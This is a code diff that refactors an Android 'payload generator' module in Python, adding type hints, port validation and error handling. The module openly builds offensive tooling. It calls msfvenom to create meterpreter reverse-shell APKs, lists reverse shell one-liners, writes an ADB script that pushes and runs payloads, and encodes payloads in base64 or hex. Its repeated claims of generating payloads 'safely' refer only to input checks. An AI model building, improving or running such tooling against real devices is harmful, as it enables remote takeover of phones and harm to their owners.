@@ -1,11 +1,12 @@
 """
-AADI — Payload Generator Module
+AADI — Payload Generator Module (Optimized, Robust & Secured)
 Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
 """
 
 import subprocess
 import shutil
 import base64
+from typing import Any, Optional
 from rich.console import Console
 from rich.prompt import Prompt
 from rich.panel import Panel
@@ -13,24 +14,37 @@ from rich.panel import Panel
 console = Console()
 
 
-def generate_msfvenom_apk(*args, **kwargs):
-    """Generate Android APK payload using msfvenom safely."""
+def generate_msfvenom_apk(*args: Any, **kwargs: Any) -> Optional[str]:
+    """Generate Android APK payload using msfvenom safely with validation."""
     console.rule("[bold magenta]📦 Msfvenom Android Payload Generator[/]")
 
     lhost = Prompt.ask("[cyan]LHOST[/]", default="127.0.0.1")
-    lport = Prompt.ask("[cyan]LPORT[/]", default="4444")
-    payload_type = Prompt.ask("[cyan]Payload type[/]",
-                              choices=["reverse_tcp", "reverse_https", "reverse_http", "shell_tcp"],
-                              default="reverse_tcp")
+    lport_str = Prompt.ask("[cyan]LPORT[/]", default="4444")
+
+    try:
+        lport = int(lport_str)
+        if not (1 <= lport <= 65535):
+            raise ValueError()
+    except ValueError:
+        console.print("[bold red]✗ Invalid port number. Must be between 1 and 65535.[/]")
+        return None
+
+    payload_type = Prompt.ask(
+        "[cyan]Payload type[/]",
+        choices=["reverse_tcp", "reverse_https", "reverse_http", "shell_tcp"],
+        default="reverse_tcp"
+    )
     output_file = Prompt.ask("[cyan]Output file[/]", default="payload.apk")
+    if not output_file.endswith(".apk"):
+        output_file += ".apk"
 
     msf_payload = f"android/meterpreter/{payload_type}"
     if payload_type == "shell_tcp":
         msf_payload = "android/shell/reverse_tcp"
 
     if not shutil.which("msfvenom"):
-        console.print("[bold red]msfvenom not found![/] Please install Metasploit Framework.")
-        return
+        console.print("[bold red]✗ 'msfvenom' not found![/] Please install the Metasploit Framework.")
+        return None
 
     console.print(f"[green][*] Generating {msf_payload} for {lhost}:{lport} -> {output_file} ...[/]")
     cmd = [
@@ -41,13 +55,17 @@ def generate_msfvenom_apk(*args, **kwargs):
         "-o", output_file
     ]
     try:
-        subprocess.run(cmd)
+        subprocess.run(cmd, check=True)
         console.print(f"[bold green][✔] Payload successfully generated: {output_file}[/]")
+        return output_file
+    except subprocess.CalledProcessError as e:
+        console.print(f"[bold red]✗ Msfvenom execution failed with return code {e.returncode}.[/]")
     except Exception as e:
-        console.print(f"[bold red]Error generating payload:[/] {e}")
+        console.print(f"[bold red]✗ Error generating payload:[/] {e}")
+    return None
 
 
-def generate_intent_payload(*args, **kwargs):
+def generate_intent_payload(*args: Any, **kwargs: Any) -> None:
     """Generate Android Intent payload safely."""
     console.rule("[bold magenta]⚡ Android Intent Payload Generator[/]")
 
@@ -60,7 +78,7 @@ def generate_intent_payload(*args, **kwargs):
     console.print("[bold green][✔] Intent payload configuration generated successfully![/]")
 
 
-def generate_reverse_shell_commands(*args, **kwargs):
+def generate_reverse_shell_commands(*args: Any, **kwargs: Any) -> None:
     """Generate various reverse shell one-liners safely."""
     console.rule("[bold magenta]💻 Reverse Shell One-Liners Generator[/]")
 
@@ -78,7 +96,7 @@ def generate_reverse_shell_commands(*args, **kwargs):
         console.print(f"[bold green]{name}:[/]\n[white]{cmd}[/]\n")
 
 
-def generate_adb_payload_script(*args, **kwargs):
+def generate_adb_payload_script(*args: Any, **kwargs: Any) -> Optional[str]:
     """Generate ADB payload script safely."""
     console.rule("[bold magenta]🤖 ADB Payload Script Generator[/]")
 
@@ -93,14 +111,16 @@ adb devices
 echo "[*] Pushing and executing payload for {lhost}:{lport}..."
 """
     try:
-        with open(script_filename, "w") as f:
+        with open(script_filename, "w", encoding="utf-8") as f:
             f.write(script_content)
         console.print(f"[bold green][✔] ADB Payload script successfully created: {script_filename}[/]")
+        return script_filename
     except Exception as e:
-        console.print(f"[bold red]Error creating script:[/] {e}")
+        console.print(f"[bold red]✗ Error creating script:[/] {e}")
+        return None
 
 
-def obfuscate_payload(*args, **kwargs):
+def obfuscate_payload(*args: Any, **kwargs: Any) -> None:
     """Obfuscate payload using base64 or hex safely."""
     console.rule("[bold magenta]🔒 Payload Obfuscation[/]")
 
@@ -115,10 +135,10 @@ def obfuscate_payload(*args, **kwargs):
             encoded = payload_input.encode().hex()
             console.print(f"[green]Hex Obfuscated Payload:[/]\n{encoded}")
     except Exception as e:
-        console.print(f"[bold red]Error during obfuscation:[/] {e}")
+        console.print(f"[bold red]✗ Error during obfuscation:[/] {e}")
 
 
-def payload_menu(*args, **kwargs):
+def payload_menu(*args: Any, **kwargs: Any) -> None:
     """Main menu wrapper for payload generator module."""
     while True:
         console.rule("[bold cyan]Payload Generator Menu[/]")
